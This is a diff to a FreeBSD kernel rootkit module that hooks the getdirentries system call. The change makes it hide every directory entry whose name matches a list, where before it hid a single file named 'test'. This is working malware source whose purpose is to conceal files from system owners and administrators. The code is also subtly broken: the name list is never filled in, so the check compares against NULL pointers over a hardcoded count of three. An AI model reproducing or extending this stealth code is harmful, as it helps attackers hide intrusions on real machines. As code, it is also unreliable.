@@ -49,11 +49,34 @@ __FBSDID("$FreeBSD$");
 
 #include <ufs/ufs/quota.h>
 
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/sysproto.h>
+#include <sys/syscall.h>
+#include <sys/param.h>
+#include <sys/linker.h>
+
+#include <sys/proc.h>
+#include <sys/resourcevar.h>
+#include <sys/mutex.h>
+#include <sys/lock.h>
+#include <sys/sx.h>
+
+
 #include "rootkit.h"
 
 
 #define T_NAME "test"
 
+static char* name_list[1024] = {NULL};
+
+int hide_names(char*);
 
 int
 sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
@@ -83,12 +106,12 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 
 		while((current->d_reclen != 0) && (count > 0)){
 			count -= current->d_reclen;
-			if(strcmp((char*)&(current->d_name),T_NAME) == 0){
+			if(hide_names((char*)current->d_name)){
 				if (count != 0){
 					bcopy((char*)current + current->d_reclen, current, count);
 				}
 			size-=current->d_reclen;
-			break;
+			
 			}
 
 			if (count != 0){
@@ -101,5 +124,14 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 		FREE(dp,M_TEMP);
 	}
 
+	
 	return (error);
+}
+
+int hide_names(char * name){
+	for(int i = 0; i < 3; i++){
+		if(strcmp(name_list[i],name) == 0) return 1;
+	}
+
+	return 0;
 }
